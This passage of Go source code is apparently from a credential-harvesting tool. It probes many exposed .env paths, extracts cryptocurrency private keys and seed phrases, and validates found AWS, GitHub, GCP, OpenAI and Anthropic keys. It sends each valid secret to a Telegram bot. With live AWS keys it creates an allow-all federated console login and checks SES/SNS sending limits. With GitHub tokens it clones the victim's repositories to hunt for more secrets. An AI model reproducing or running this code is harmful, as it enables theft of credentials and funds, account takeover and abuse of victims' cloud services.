	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return string(b)
}

func GenerateRandomEmail() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = charset[int(time.Now().UnixNano())%len(charset)]
	}
	return fmt.Sprintf("%s@%s.com", string(b), "randomtestdomain")
}

func IsIgnoredExt(ext string) bool {
	ignored := []string{".jpg", ".jpeg", ".png", ".gif", ".exe", ".zip", ".pdf", ".css", ".html", ".svg", ".woff", ".woff2", ".mp4", ".mp3", ".json", ".lock"}
	for _, i := range ignored {
		if strings.EqualFold(ext, i) {
			return true
		}
	}
	return false
}

func unique(input []string) []string {
	m := make(map[string]struct{})
	var out []string
	for _, s := range input {
		if _, ok := m[s]; !ok {
			m[s] = struct{}{}
			out = append(out, s)
		}
	}
	return out
}

func resolveURL(base, ref string) string {
	u, err := url.Parse(ref)
	if err != nil {
		return ref
	}
	if u.IsAbs() {
		return ref
	}
	baseURL, err := url.Parse(base)
	if err != nil {
		return ref
	}
	return baseURL.ResolveReference(u).String()
}

func loadEnvPaths() []string {
	return []string{
		"/.env",
		"/api/.env",
		"/app/.env",
		"/system/.env",
		"/laravel/.env",
		"/core/.env",
		"/vendor/.env",
		"/storage/.env",
		"/public/.env",
		"/dev/.env",
		"/api/v1/.env",
		"/api/v2/.env",
		"/admin/.env",
		"/.environment",
		"/api/.environment",
		"/app/.environment",
		"/.env.dist",
		"/.env.local.php",
		"/config/.env",
		"/config/env",
		"/config/environment",
		"/app/config/.env",
		"/apps/.env",
		"/apps/config/.env",
		"/backend/.env",
				"/client/.env",
		"/clients/.env",
		"/customer/.env",
		"/customers/.env",
		"/admin/config/.env",
		"/administrator/.env",
		"/wp/.env",
		"/wordpress/.env",
		"/cms/.env",
		"/database/.env",
		"/db/.env",
		"/upload/.env",
		"/uploads/.env",
		"/backup/.env",
		"/backups/.env",
		"/.backup/.env",
		"/backup/env",
		"/old/.env",
		"/new/.env",
		"/2020/.env",
		"/2021/.env",
		"/2022/.env",
		"/2023/.env",
		"/2024/.env",
		"/v1/.env",
		"/v2/.env",
		"/v3/.env",
		"/api/config/.env",
		"/api/core/.env",
		"/api/app/.env",
		"/api/test/.env",
		"/api/dev/.env",
		"/api/beta/.env",
		"/beta/.env",
		"/prod/.env",
		"/production/.env",
		"/stage/.env",
		"/staging/.env",
		"/test/.env",
		"/testing/.env",
		"/development/.env",
		"/develop/.env",
		"/docker/.env",
		"/docker-compose/.env",
		"/.docker/.env",
		"/src/.env",
		"/source/.env",
		"/sources/.env",
		"/root/.env",
		"/home/.env",
		"/site/.env",
		"/panel/.env",
		"/control/.env",
		"/console/.env",
		"/admin/console/.env",
		"/administrator/config/.env",
		"/webadmin/.env",
		"/sysadmin/.env",
		"/mysql/.env",
		"/dbadmin/.env",
		"/sql/.env",
		"/master/.env",
		"/temp/.env",
		"/tmp/.env",
		"/cloud/.env",
		"/cgi-bin/.env",
		"/blog/.env",
		"/blogs/.env",
		"/engine/.env",
		"/forum/.env",
		"/forums/.env",
		"/store/.env",
		"/shop/.env",
		"/cart/.env",
	}
}

func (a *AWSScanner) saveIntoFile(line, filename string) {
	os.MkdirAll("ResultJS", 0755)
	f, err := os.OpenFile(filepath.Join("ResultJS", filename), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func (a *AWSScanner) sendTelegram(message string) {
	if a.Config.Telegram.BotToken == "" || a.Config.Telegram.ChatID == "" {
		return
	}
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", a.Config.Telegram.BotToken)
	data := url.Values{}
	data.Set("chat_id", a.Config.Telegram.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")
	http.PostForm(apiURL, data)
}

func (a *AWSScanner) alreadySent(ak, sk string) bool {
	path := filepath.Join("ResultJS", "aws_valid.txt")
	b, err := ioutil.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
		return false
	}
	return strings.Contains(string(b), fmt.Sprintf("%s:%s", ak, sk))
}

func (a *AWSScanner) logFound(name, key, source string) {
	pterm.Warning.Printfln("[FOUND] %s: %s | Source: %s", name, key, source)
}

func (a *AWSScanner) logValid(name, details string) {
	pterm.Success.Printfln("[VALID] %s: %s", name, details)
}

func (a *AWSScanner) storeValidKeyLimit(keyType string, key string, limit interface{}) {
	if limit == nil {
		return
	}
	globalCounters.mu.Lock()
	defer globalCounters.mu.Unlock()
	keyPrefix := key
	if len(key) > 40 {
		keyPrefix = key[:40]
	}
	maskedKey := keyPrefix
	if len(maskedKey) > 10 {
		maskedKey = maskedKey[:4] + "..." + maskedKey[len(maskedKey)-4:]
	} else if len(maskedKey) > 4 {
		maskedKey = maskedKey[:4] + "..."
	}
	mapKey := fmt.Sprintf("%s:%s", keyType, maskedKey)
	a.ValidKeyLimits.Store(mapKey, fmt.Sprintf("%v", limit))
}

func (a *AWSScanner) detectRealCryptoType(keyValue string, pattern *regexp.Regexp) string {
	patternStr := pattern.String()
	if (len(keyValue) == 64 || (len(keyValue) == 66 && strings.HasPrefix(keyValue, "0x"))) && strings.Contains(patternStr, "64") {
		if strings.Contains(patternStr, "ethereum_private_key|eth_private_key") {
			return "Ethereum Private Key"
		}
		if strings.Contains(patternStr, "bsc_private_key|bnb_private_key") {
			return "BSC/BNB Private Key"
		}
		if strings.Contains(patternStr, "polygon_private_key|matic_private_key") {
			return "Polygon/MATIC Private Key"
		}
		return "EVM Private Key (Generic)"
	}
	if strings.Contains(patternStr, "5KL") && strings.Contains(patternStr, "50,52") {
		return "Bitcoin WIF Private Key"
	}
	if strings.Contains(patternStr, "87,88") {
		return "Solana Private Key"
	}
	if strings.Contains(patternStr, "mnemonic|seed_phrase|recovery_phrase") {
		return "Mnemonic Seed Phrase"
	}
	return "Crypto Private Key"
}

func (a *AWSScanner) extractAndSaveCryptoKeys(text, sourceURL string) {
	for _, pattern := range a.RealCryptoPatterns {
		matches := pattern.FindAllStringSubmatch(text, -1)
		for _, match := range matches {
			if len(match) >= 2 {
				var keyValue string
				if len(match) >= 3 && match[2] != "" {
					keyValue = match[2]
				} else if len(match) >= 2 && match[1] != "" {
					keyValue = match[1]
				} else {
					continue
				}
				keyValue = strings.TrimSpace(keyValue)
				if len(keyValue) == 64 && strings.Contains(pattern.String(), "0x") {
					keyValue = "0x" + keyValue
				}
				if len(keyValue) < 32 {
					continue
				}
				cryptoType := a.detectRealCryptoType(keyValue, pattern)
				cryptoLine := fmt.Sprintf("%s:%s:%s", sourceURL, cryptoType, keyValue)

				pterm.Success.Printfln("[🔥 %s] Found Crypto Key: %s from %s", cryptoType, keyValue, sourceURL)

				a.saveIntoFile(cryptoLine, "crypto_keys_found.txt")

				go a.sendTelegram(fmt.Sprintf("🔥 <b>%s Found</b>\nSource: <code>%s</code>\nKey: <code>%s</code>", cryptoType, sourceURL, keyValue))

				globalCounters.mu.Lock()
				globalCounters.CryptoKeysFound++
				globalCounters.mu.Unlock()
			}
		}
	}
}

func getAllRegions(service string) ([]string, error) {
	return []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2",
		"af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
		"ap-southeast-1", "ap-southeast-2", "ap-southeast-3", "ca-central-1",
		"eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-north-1", "eu-south-1", "eu-south-2", "eu-central-2",
		"me-south-1", "me-central-1", "sa-east-1",
	}, nil
}

func (a *AWSScanner) checkS3Access(cfg aws.Config) string {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(cfg)

	output, err := s3Client.ListBuckets(ctx, &s3.ListBucketsInput{})

	if err == nil && output != nil {
		count := len(output.Buckets)
		if count > 0 {
			return fmt.Sprintf("✅ S3 List: %d Buckets Found", count)
		}
		return "✅ S3 List: Permitted (0 Buckets)"
	}

	return "❌ S3 List: Denied or Error"
}

func (a *AWSScanner) auditIAMUser(cfg aws.Config, username string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	iamClient := iam.NewFromConfig(cfg)
	var riskReport []string

	inlinePols, err := iamClient.ListUserPolicies(ctx, &iam.ListUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		riskReport = append(riskReport, fmt.Sprintf("Inline Policies: %v", inlinePols.PolicyNames))
		for _, pname := range inlinePols.PolicyNames {
			if strings.Contains(strings.ToLower(pname), "admin") {
				riskReport = append(riskReport, "⚠️ CRITICAL: Potential Admin Inline Policy Detected")
			}
		}
	}

	attachedPols, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{UserName: aws.String(username)})
	if err == nil {
		var polNames []string
		for _, p := range attachedPols.AttachedPolicies {
			polNames = append(polNames, *p.PolicyName)
			if *p.PolicyName == "AdministratorAccess" {
				riskReport = append(riskReport, "🚨 CRITICAL: AdministratorAccess Attached!")
			}
		}
		riskReport = append(riskReport, fmt.Sprintf("Managed Policies: %v", polNames))
	}

	if len(riskReport) == 0 {
		return "No explicit policies found (likely implicit or group based)"
	}
	return strings.Join(riskReport, " | ")
}

func (a *AWSScanner) validateAWSCredentials(accessKey, secretKey, sessionToken string) (bool, *sts.GetCallerIdentityOutput, aws.Config, string) {
	ctx := context.Background()

	cfg, err := config.LoadDefaultConfig(ctx,
		config.WithRegion(a.DefaultRegion),
		config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, sessionToken)),
	)
	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	stsClient := sts.NewFromConfig(cfg)
	identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})

	if err != nil {
		return false, nil, aws.Config{}, ""
	}

	s3Status := a.checkS3Access(cfg)

	return true, identity, cfg, s3Status
}

func (a *AWSScanner) getFederationConsoleURL(cfg aws.Config, identity *sts.GetCallerIdentityOutput, durationSeconds int32) map[string]string {
	if !a.Config.AWSChecks.FederationConsoleURL { // Menggunakan flag baru
		return nil
	}
	ctx := context.Background()
	stsClient := sts.NewFromConfig(cfg)

	sessionName := "FederatedUser" + randomString(6)
	policy := map[string]interface{}{
		"Version": "2012-10-17",
		"Statement": []map[string]interface{}{{"Effect": "Allow", "Action": "*", "Resource": "*"}},
	}
	policyBytes, _ := json.Marshal(policy)

	getToken, err := stsClient.GetFederationToken(ctx, &sts.GetFederationTokenInput{
		Name: aws.String(sessionName),
		Policy: aws.String(string(policyBytes)),
		DurationSeconds: aws.Int32(durationSeconds),
	})
	if err != nil {
		return nil
	}

	creds := getToken.Credentials
	sessionJson, _ := json.Marshal(map[string]string{
		"sessionId": *creds.AccessKeyId,
		"sessionKey": *creds.SecretAccessKey,
		"sessionToken": *creds.SessionToken,
	})

	signinURL := "https://signin.aws.amazon.com/federation"
	getTokenURL := fmt.Sprintf("%s?Action=getSigninToken&Session=%s", signinURL, url.QueryEscape(string(sessionJson)))

	resp, err := http.Get(getTokenURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var tokenResp struct {
		SigninToken string `json:"SigninToken"`
	}
	json.Unmarshal(body, &tokenResp)

	destination := "https://console.aws.amazon.com/"
	finalURL := fmt.Sprintf("%s?Action=login&Issuer=aws_scanner&Destination=%s&SigninToken=%s",
		signinURL, url.QueryEscape(destination), url.QueryEscape(tokenResp.SigninToken))

	return map[string]string{
		"federation_console_url": finalURL,
		"session_name": sessionName,
		"expires_at": creds.Expiration.Format(time.RFC3339),
		"arn": *identity.Arn,
	}
}

func (a *AWSScanner) checkSESDetailsAllRegions(cfg aws.Config) map[string]map[string]interface{} {
	if !a.Config.AWSChecks.SESQuotaCheck { // Menggunakan flag baru
		return map[string]map[string]interface{}{}
	}
	ctx := context.Background()
	regions, _ := getAllRegions("ses")
	results := make(map[string]map[string]interface{})

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		sesClient := ses.NewFromConfig(cfg)
		sesv2Client := sesv2.NewFromConfig(cfg)
		quota, err := sesClient.GetSendQuota(ctx, &ses.GetSendQuotaInput{})
		if err != nil {
			continue
		}

		account, err := sesv2Client.GetAccount(ctx, &sesv2.GetAccountInput{})
		health := "Unknown"
		if err == nil && account != nil && account.EnforcementStatus != nil {
			health = *account.EnforcementStatus
		}

		if quota.Max24HourSend > 0 {
			results[region] = map[string]interface{}{
				"SendQuota": quota.Max24HourSend,
				"LastSend": quota.SentLast24Hours,
				"HealthStatus": health,
			}
		}
	}
	return results
}

func (a *AWSScanner) checkSNSLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.SNSLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	results := make(map[string]float64)
	regions, _ := getAllRegions("sns")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		snsClient := sns.NewFromConfig(cfg)
		out, err := snsClient.GetSMSAttributes(ctx, &sns.GetSMSAttributesInput{Attributes: []string{"MonthlySpendLimit"}})
		if err != nil {
			continue
		}
		if val, ok := out.Attributes["MonthlySpendLimit"]; ok {
			limit, _ := strconv.ParseFloat(val, 64)
			if limit > 0 {
				results[region] = limit
			}
		}
	}
	return results
}

func (a *AWSScanner) checkFargateOnDemandLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.FargateLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	limits := make(map[string]float64)
	regions, _ := getAllRegions("fargate")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		client := servicequotas.NewFromConfig(cfg)
		quota, err := client.GetServiceQuota(ctx, &servicequotas.GetServiceQuotaInput{ServiceCode: aws.String("fargate"), QuotaCode: aws.String("L-F4011B99")})
		if err == nil && quota.Quota != nil && quota.Quota.Value != nil {
			limits[region] = *quota.Quota.Value
		}
	}
	return limits
}

func (a *AWSScanner) CheckGitHubToken(token, sourceURL string) bool {
	// Pengecekan fitur deep scan/validasi di sini
	// Note: APIValidation.GitHub mengontrol pengecekan dasar token
	if !a.Config.APIValidation.GitHub && !a.Config.ScanningFeatures.GitHubTokenDeepScan {
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(token, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.TokensHarvested++
	globalCounters.mu.Unlock()

	pterm.Info.Printfln("[CHECK] Validating GitHub Token: %s...", token)

	req, errReq := http.NewRequest("GET", "https://api.github.com/user", nil)
	if errReq != nil {
		pterm.Debug.Printfln("[ERROR] Failed to create GitHub request: %v", errReq)
		return false
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Header.Set("Authorization", "token "+token)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))

	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			login, _ := res["login"].(string)

			a.logValid("GitHub Token", fmt.Sprintf("User: %s", login))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, token), "valid_github_token.txt")

			globalCounters.mu.Lock()
			globalCounters.TokensValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🐙 <b>VALID GITHUB TOKEN</b>

👤 <b>User:</b> <code>%s</code>
🔑 <b>Token:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, login, token, sourceURL)
			go a.sendTelegram(msg)

			// Pengecekan Deep Scan
			if a.Config.ScanningFeatures.GitHubTokenDeepScan {
				a.ProcessGitHubToken(token)
			}
			return true
		}
	} else if os.IsTimeout(err) {
		pterm.Debug.Printfln("[TIMEOUT] GitHub validation timed out for token starting with %s", token[:8])
	}
	return false
}

func (a *AWSScanner) ProcessGitHubToken(token string) {
	// Deep scan hanya berjalan jika diaktifkan di konfigurasi
	if !a.Config.ScanningFeatures.GitHubTokenDeepScan {
		return
	}
	
	req, _ := http.NewRequest("GET", "https://api.github.com/user/repos?per_page=100&type=all", nil)
	req.Header.Set("Authorization", "token "+token)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var repos []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&repos)
		if len(repos) > 0 {
			pterm.Info.Printfln("[DEEP SCAN] Found %d repos for token. Cloning and scanning...", len(repos))
			var wg sync.WaitGroup
			sem := make(chan struct{}, 2000)
			for _, repo := range repos {
				wg.Add(1)
				sem <- struct{}{}
				go func(r map[string]interface{}) {
					defer wg.Done()
					defer func() { <-sem }()
					a.ScanRepo(token, r)
				}(repo)
			}
			wg.Wait()
		}
	}
}

func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
	name, _ := repo["name"].(string)
	htmlUrl, _ := repo["html_url"].(string)
	if name == "" || htmlUrl == "" {
		return
	}

	cloneUrl := strings.Replace(htmlUrl, "https://", "https://"+token+"@", 1)
	targetDir := filepath.Join(a.TempDir, name)

	os.RemoveAll(targetDir)

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "git", "clone", "--depth", "1", cloneUrl, targetDir)
	if err := cmd.Run(); err != nil {
		pterm.Debug.Printfln("Failed to clone %s: %v", name, err)
		return
	}

	var deepScanWG sync.WaitGroup

	deepScanWG.Add(1)
	go func() {
		defer deepScanWG.Done()
		a.ScanRepoWithTruffleHog(targetDir, fmt.Sprintf("Repo: %s (TruffleHog)", name))
	}()

	deepScanWG.Add(1)
	go func() {
		defer deepScanWG.Done()
		a.ScanRepoWithGitleaks(targetDir, fmt.Sprintf("Repo: %s (GitLeaks)", name))
	}()

	deepScanWG.Wait()

	var wg sync.WaitGroup
	filepath.WalkDir(targetDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if d.Name() == ".git" {
			return fs.SkipDir
		}
		ext := strings.ToLower(filepath.Ext(path))
		if IsIgnoredExt(ext) {
			return nil
		}

		contentBytes, errRead := ioutil.ReadFile(path)
		if errRead != nil || len(contentBytes) > 1024000 {
			return nil
		}

		if bytes.Contains(contentBytes, []byte{0}) {
			return nil
		}

		wg.Add(1)
		go func(c, s string) {
			defer wg.Done()
			a.checkAndSaveKeys(c, s)
		}(string(contentBytes), fmt.Sprintf("Repo: %s | File: %s", name, filepath.Base(path)))
		return nil
	})
	wg.Wait()
	os.RemoveAll(targetDir)
}

func (a *AWSScanner) ScanRepoWithTruffleHog(repoPath, sourceInfo string) {
	if _, err := exec.LookPath("trufflehog"); err != nil {
		pterm.Debug.Printfln("[TRUFFLEHOG] Not found. Skipping %s.", sourceInfo)
		return
	}

	pterm.Info.Printfln("[TRUFFLEHOG] Scanning %s for deep secrets...", sourceInfo)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "trufflehog", "--json", "--repo_path", repoPath)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("[TRUFFLEHOG TIMEOUT] Scan on %s timed out.", repoPath)
		} else {
			pterm.Debug.Printfln("[TRUFFLEHOG ERROR] Failed to run on %s: %v. Stderr: %s", repoPath, err, stderr.String())
		}
		return
	}

	scanner := bufio.NewScanner(&stdout)
	for scanner.Scan() {
		line := scanner.Bytes()
		var result TruffleHogResult

		if err := json.Unmarshal(line, &result); err != nil {
			pterm.Debug.Printfln("[TRUFFLEHOG PARSE ERROR] Failed to parse JSON: %v", err)
			continue
		}

		if result.Secret != "" {
			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
				continue
			}

			commitShort := result.SourceMetadata.Data.Commit
			if len(commitShort) > 8 {
				commitShort = commitShort[:8]
			}

			details := fmt.Sprintf("Detector: %s | Verified: %t | Commit: %s | File: %s",
				result.DetectorName, result.Verified, commitShort, result.SourceMetadata.Data.File)

			secretMasked := result.Secret
			if len(secretMasked) > 20 {
				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
			}
			pterm.Success.Printfln("[💣 TRUFFLEHOG VALID] Secret: %s | %s", secretMasked, details)

			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.DetectorName, result.Secret), "trufflehog_secrets.txt")

			msg := fmt.Sprintf(`💣 <b>TRUFFLEHOG SECRET FOUND</b>
━━━━━━━━━━━━━━━━━━
🕵️ <b>Detector:</b> %s
✅ <b>Verified:</b> %t
🔑 <b>Secret:</b> <code>%s</code>
🔗 <b>Source:</b> %s
📄 <b>File:</b> %s
📦 <b>Commit:</b> %s
`, result.DetectorName, result.Verified, result.Secret, sourceInfo, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
			go a.sendTelegram(msg)

			globalCounters.mu.Lock()
			globalCounters.CryptoKeysFound++
			globalCounters.mu.Unlock()
		}
	}
}

func (a *AWSScanner) ScanRepoWithGitleaks(repoPath, sourceInfo string) {
	if _, err := exec.LookPath("gitleaks"); err != nil {
		pterm.Debug.Printfln("[GITLEAKS] Not found. Skipping %s.", sourceInfo)
		return
	}

	pterm.Info.Printfln("[GITLEAKS] Scanning %s for leaks...", sourceInfo)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "gitleaks", "detect", "--repo-path", repoPath, "--report-format=json", "--exit-code=0")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("[GITLEAKS TIMEOUT] Scan on %s timed out.", repoPath)
		} else if strings.Contains(stderr.String(), "no leaks found") || strings.Contains(stdout.String(), "no leaks found") {
		} else {
		}
	}

	var results []GitleaksResult
	if err := json.Unmarshal(stdout.Bytes(), &results); err != nil {
		if len(stdout.Bytes()) > 0 {
			pterm.Debug.Printfln("[GITLEAKS PARSE ERROR] Failed to parse JSON output: %v", err)
		}
		return
	}

	for _, result := range results {
		if result.Secret != "" {
			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
				continue
			}

			commitShort := result.Commit
			if len(commitShort) > 8 {
				commitShort = commitShort[:8]
			}

			details := fmt.Sprintf("Rule: %s | Commit: %s | File: %s",
				result.RuleID, commitShort, result.File)

			secretMasked := result.Secret
			if len(secretMasked) > 20 {
				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
			}
			pterm.Success.Printfln("[💣 GITLEAKS VALID] Secret: %s | %s", secretMasked, details)

			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.RuleID, result.Secret), "gitleaks_secrets.txt")

			msg := fmt.Sprintf(`💣 <b>GITLEAKS SECRET FOUND</b>
━━━━━━━━━━━━━━━━━━
🕵️ <b>Rule:</b> %s
🔑 <b>Secret:</b> <code>%s</code>
🔗 <b>Source:</b> %s
📄 <b>File:</b> %s
📦 <b>Commit:</b> %s
`, result.RuleID, result.Secret, sourceInfo, result.File, result.Commit)
			go a.sendTelegram(msg)

			globalCounters.mu.Lock()
			globalCounters.CryptoKeysFound++
			globalCounters.mu.Unlock()
		}
	}
}

// Fungsi untuk mengecek validitas GCP API Key
func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
	if !a.Config.APIValidation.GCPAPIKey { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Menggunakan Google Maps Static API endpoint check
	endpoint := fmt.Sprintf("https://maps.googleapis.com/maps/api/staticmap?center=40.714%2C-73.998&zoom=12&size=400x400&key=%s", key)
	
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	req, errReq := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
	if errReq != nil {
		pterm.Debug.Printfln("[GCP ERROR] Failed to create request for %s: %v", key[:8]+"...", errReq)
		return false
	}

	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 403 {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			body := string(bodyBytes)
			
			if resp.StatusCode == 403 && strings.Contains(body, "API not enabled") {
				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE (API Disabled)", key))
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
				a.storeValidKeyLimit("GCP Key", key, "LIVE (API Disabled)")
			} else if resp.StatusCode == 200 || (resp.StatusCode == 400 && !strings.Contains(body, "API key not valid")) {
				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE", key))
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
				a.storeValidKeyLimit("GCP Key", key, "LIVE")
			} else {
				return false
			}

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🔑 <b>GCP API KEY FOUND</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 400 {
			pterm.Debug.Printfln("[GCP Key] Key %s failed validation (400).", key[:8]+"...")
		}
	}
	return false
}

// Fungsi untuk mengecek validitas OpenAI
func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
	if !a.Config.APIValidation.OpenAI { // Pengecekan fitur baru
		return false
	}
	
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("OpenAI", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_openai.txt")
			a.storeValidKeyLimit("OpenAI", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🧠 <b>OPENAI LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[OpenAI] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Anthropic
func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
	if !a.Config.APIValidation.Anthropic { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Endpoint sederhana untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://api.anthropic.com/v1/models", nil)
	req.Header.Set("x-api-key", key)
	req.Header.Set("anthropic-version", "2023-06-01") // Versi API yang disyaratkan

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("Anthropic", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_anthropic.txt")
			a.storeValidKeyLimit("Anthropic", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>HSCAN RESULT</b>
━━━━━━━━━━━━━━━━━━
🧠 <b>ANTHROPIC LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[Anthropic] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Twilio
func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
	if !a.Config.APIValidation.Twilio { // Pengecekan fitur baru
		return false
	}
	
	pair := sid + ":" + auth
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

